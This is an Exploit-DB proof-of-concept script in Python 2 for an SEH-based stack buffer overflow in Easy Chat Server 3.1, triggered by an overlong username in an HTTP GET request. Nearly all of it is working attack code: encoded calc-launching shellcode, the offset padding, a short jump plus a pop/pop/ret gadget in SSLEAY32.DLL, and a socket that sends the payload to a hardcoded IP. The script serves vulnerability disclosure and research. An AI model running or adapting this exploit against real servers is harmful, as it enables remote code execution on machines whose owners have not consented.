## Exploit-DB Note: The offset to SEH is influenced by the installation path of the program.
## For this specific exploit to work, easy chat must be installed to:
## \'C:\\Program Files\\EFS Software\\Easy Chat Server\'


# Exploit Title: Easy Chat Server 3.1 stack buffer overflow
# Date: 9 May 2014
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://www.echatserver.com/
# Software Link: http://www.echatserver.com/
# Version: 3.1
# Tested on: Windows 7 Enterprise SP1, English
#
# Description: 
# A buffer overflow is triggered when when passing a long username.


import socket
import struct

# calc shellcode from https://code.google.com/p/win-exec-calc-shellcode/
# msfencode -b \"\\x00\\x20\" -i w32-exec-calc-shellcode.bin 
# [*] x86/shikata_ga_nai succeeded with size 101 (iteration=1)
shellcode = ( 
\"\\xd9\\xcb\\xbe\\xb9\\x23\\x67\\x31\\xd9\\x74\\x24\\xf4\\x5a\\x29\\xc9\" +
\"\\xb1\\x13\\x31\\x72\\x19\\x83\\xc2\\x04\\x03\\x72\\x15\\x5b\\xd6\\x56\" +
\"\\xe3\\xc9\\x71\\xfa\\x62\\x81\\xe2\\x75\\x82\\x0b\\xb3\\xe1\\xc0\\xd9\" +
\"\\x0b\\x61\\xa0\\x11\\xe7\\x03\\x41\\x84\\x7c\\xdb\\xd2\\xa8\\x9a\\x97\" +
\"\\xba\\x68\\x10\\xfb\\x5b\\xe8\\xad\\x70\\x7b\\x28\\xb3\\x86\\x08\\x64\" +
\"\\xac\\x52\\x0e\\x8d\\xdd\\x2d\\x3c\\x3c\\xa0\\xfc\\xbc\\x82\\x23\\xa8\" +
\"\\xd7\\x94\\x6e\\x23\\xd9\\xe3\\x05\\xd4\\x05\\xf2\\x1b\\xe9\\x09\\x5a\" +
\"\\x1c\\x39\\xbd\"
)

# SEH overwritten at offset 207 when Easy Chat Server is  
# installed in C:\\Program Files\\EFS Software\\Easy Chat Server
payload =  \"A\"*203
payload += \"\\xeb\\x06\\x90\\x90\"           # short jmp to shellcode
payload += \"\\x1e\\x0e\\x01\\x10\"           # pop/pop/ret @ 0x10010E1E SSLEAY32.DLL
payload += \"\\x81\\xc4\\xd8\\xfe\\xff\\xff\"   # add esp,-128
payload += shellcode                    # calc.exe
payload += \"D\"*193

buf = (
\"GET /chat.ghp?username=\" + payload + \"&password=&room=1&sex=1 HTTP/1.1\\r\\n\"
\"User-Agent: Mozilla/4.0\\r\\n\"
\"Host: 192.168.1.136:80\\r\\n\"
\"Accept-Language: en-us\\r\\n\"
\"Accept-Encoding: gzip, deflate\\r\\n\"
\"Referer: http://192.168.1.136\\r\\n\"
\"Connection: Keep-Alive\\r\\n\\r\\n\"
)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((\"192.168.123.131\", 80))
s.send(buf)
print s.recv(1024)
